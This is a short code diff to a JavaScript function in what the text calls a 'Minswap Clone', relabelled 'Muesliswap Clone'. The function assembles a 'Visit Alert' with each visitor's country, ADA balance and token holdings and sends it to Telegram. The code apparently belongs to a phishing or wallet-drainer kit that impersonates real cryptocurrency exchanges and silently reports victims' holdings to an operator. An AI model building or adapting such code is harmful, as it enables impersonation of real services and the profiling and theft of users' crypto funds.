@@ -45,14 +45,14 @@ export const sendAppDetailsToTelegram = async (adaBalance, tokens) => {
   const globeIcon = "🌍";  // Unicode globe icon
 
   let message = `*Visit Alert*\n` +
-                `App: Minswap Clone\n\n` +
-                `User Info--------------------\n` +
-                `| Country: ${globeIcon} ${country} |\n` +
-                `--------------------------------\n` +
-                `| User Wallet Balance |\n` +
-                `| ADA: ${adaBalance.toFixed(2)} ADA       |\n` +
-                `${tokenDetails.join("\n")}\n` +
-                `------------------------------End`;
+    `App: Muesliswap Clone\n\n` +
+    `User Info--------------------\n` +
+    `| Country: ${globeIcon} ${country} |\n` +
+    `--------------------------------\n` +
+    `| User Wallet Balance |\n` +
+    `| ADA: ${adaBalance.toFixed(2)} ADA       |\n` +
+    `${tokenDetails.join("\n")}\n` +
+    `------------------------------End`;
 
   // Send the message to Telegram
   await sendMessageToTelegram(message);
